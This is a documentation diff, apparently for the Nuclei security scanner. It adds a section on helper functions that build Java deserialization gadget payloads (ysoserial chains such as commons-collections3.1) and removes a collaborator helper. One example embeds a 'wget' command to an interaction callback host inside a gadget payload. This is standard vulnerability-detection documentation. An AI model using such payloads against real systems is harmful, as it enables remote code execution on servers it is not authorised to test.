@@ -38,4 +38,42 @@ Here is the list of all supported helper functions can be used in the RAW reques
 | rand_text_numeric       | Pick a random sequence of length l among numbers avoiding badchars                                                                         | rand_text_numeric(l, "charset")                        |
 | rand_int                | Pick a random integer between min and max                                                                                                  | rand_int(min, max)                                     |
 | waitfor                 | block the logic execution for x seconds                                                                                                    | waitfor(10)                                            |
-| collab                  | Checks if burp collaborator interactions contains a particular pattern                                                                     | collab("aaa.burpcollaborator.net")                     |
+
+
+#### Deserialization helper functions
+
+Nuclei allows payload generation for a few commom gadget from [ysoserial](https://github.com/frohoff/ysoserial).
+
+**Supported Payload:**
+
+- dns (URLDNS)
+- commons-collections3.1
+- commons-collections4.0
+- jdk7u21
+- jdk8u20
+- groovy1
+
+**Supported encodings:**
+
+- base64 (default)
+- gzip-base64
+- gzip
+- hex
+- raw
+
+**Deserialization helper function format:**
+
+```sh
+{{generate_java_gadget(payload, cmd, encoding}}
+```
+
+**Deserialization helper function example:**
+
+```sh
+{{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}
+```
+
+
+
+
+
